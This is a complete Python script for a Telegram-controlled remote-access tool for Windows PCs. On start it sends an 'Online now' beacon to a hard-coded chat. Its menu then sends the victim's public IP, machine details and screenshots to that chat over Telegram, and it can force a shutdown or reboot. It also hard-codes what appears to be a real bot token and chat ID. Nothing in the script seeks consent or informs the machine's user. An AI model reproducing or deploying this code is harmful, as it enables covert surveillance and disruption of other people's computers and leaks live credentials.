import telebot
from telebot import types
import requests
import time
import pyautogui
import platform
import os

HOSTS = "Online now"
TOKEN = "5605098599:AAGak4THcCgUCW1qCI6OjHifyXB8EMf-Ywg"
CHAT_ID = "504466037"
bot = telebot.TeleBot(TOKEN)

requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={HOSTS}")

# some line

## Menu Keyboard ##
menu_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True,
                                          one_time_keyboard=False)
btn_ip = types.KeyboardButton('IP Address β')
btn_spec = types.KeyboardButton('Specifications π»')
btn_screenshot = types.KeyboardButton('Screenshot π₯')
btn_wallpaper = types.KeyboardButton('Change Wallpaper π')
btn_shutdown = types.KeyboardButton('Turn off PC β')
btn_reboot = types.KeyboardButton('Reboot PC β»')
menu_keyboard.row(btn_ip, btn_spec)
menu_keyboard.row(btn_screenshot, btn_wallpaper)
menu_keyboard.row(btn_shutdown, btn_reboot)

help_msg = '''
IP Address β  -  Shows your PC IP Address

Specifications π»  -  PC specs

Screenshot π₯  -  Takes a screenshot of your PC screen

Change Wallpaper π  -  Changes your wallpaper ?)

Turn off PC β  -  Turns off your PC ?)

Reboot PC β»  -  Reboots your PC ?)
'''


@bot.message_handler(commands=["start"])
def start(message):
    bot.send_message(CHAT_ID, "Π ΠΊΠΎΠΌΠ°Π½Π΄Π°Ρ - /help",
                     reply_markup=menu_keyboard)


@bot.message_handler(commands=["help"])
def get_help(message):
    bot.send_message(CHAT_ID, help_msg,
                     reply_markup=menu_keyboard)


@bot.message_handler(content_types=["text"])
def commands_handler(message):
    if message.text == "IP Address β":
        get_ip(message)
    elif message.text == "Specifications π»":
        get_specs(message)
    elif message.text == "Screenshot π₯":
        get_screen(message)
    elif message.text == "Change Wallpaper π":
        get_wallpaper(message)
    elif message.text == "Turn off PC β":
        get_turnoff(message)
    elif message.text == "Reboot PC β»":
        get_reboot(message)
    else:
        pass


@bot.message_handler(commands=["ip", "ip_address"])
def get_ip(message):
    response = requests.get("http://ip.42.pl/raw").text
    bot.send_message(message.chat.id, f"Your IP Address is: {response}")


@bot.message_handler(commands=["specifications", "spec", "specs"])
def get_specs(message):
    banner = f"""
    Name PC: {platform.node()}
    Processor: {platform.processor()}
    System: {platform.system()} {platform.release()}
    """
    bot.send_message(message.chat.id, banner)


@bot.message_handler(commands=["screenshot", "screen"])
def get_screen(message):
    # filename = f"{time.time()}.jpg"
    pyautogui.screenshot("000.jpg")

    with open("000.jpg", "rb") as img:
        bot.send_photo(message.chat.id, img)
    os.remove("000.jpg")


@bot.message_handler(commands=["wallpaper", "wall"])
def get_wallpaper(message):
    bot.send_message(message.chat.id, ')))))')


@bot.message_handler(commands=["turnoff"])
def get_turnoff(message):
    os.system('shutdown -s /t 0 /f')


@bot.message_handler(commands=["reboot"])
def get_reboot(message):
    os.system('shutdown -r /t 0 /f')


if __name__ == '__main__':
    bot.infinity_polling()
